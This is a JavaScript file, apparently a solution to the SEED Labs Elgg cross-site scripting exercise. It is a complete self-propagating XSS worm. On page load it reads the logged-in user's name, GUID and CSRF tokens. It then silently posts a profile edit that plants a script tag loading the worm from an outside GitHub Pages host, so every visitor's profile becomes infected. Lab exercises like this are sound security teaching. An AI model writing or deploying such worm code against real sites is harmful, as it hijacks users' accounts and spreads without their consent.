window.onload = function() {
    // Retrieve current user's basic information and security tokens
    var userName = "&name=" + encodeURIComponent(elgg.session.user.name);
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // Construct worm script tags to self-propagate
    var wormScriptURL = "https://n1ck-n4m3.github.io/js/xss_worm.js";
    var headerTag = "<script type='text/javascript' src='" + wormScriptURL + "'></script>";
    
    // Construct the profile description content that includes the worm and a custom message
    var content = "description=XSS_WORM by Samy!!! " + headerTag;

    var samyGuid = 59; // Assume Samy's user GUID is 59
    var sendurl = "http://www.seed-server.com/action/profile/edit?" + ts + token + userName + guid + "&" + content;

    // Only execute the code if the current user is not Samy to avoid self-infection
    if (elgg.session.user.guid != samyGuid) {
        // Create and send an Ajax request to modify the profile
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
};
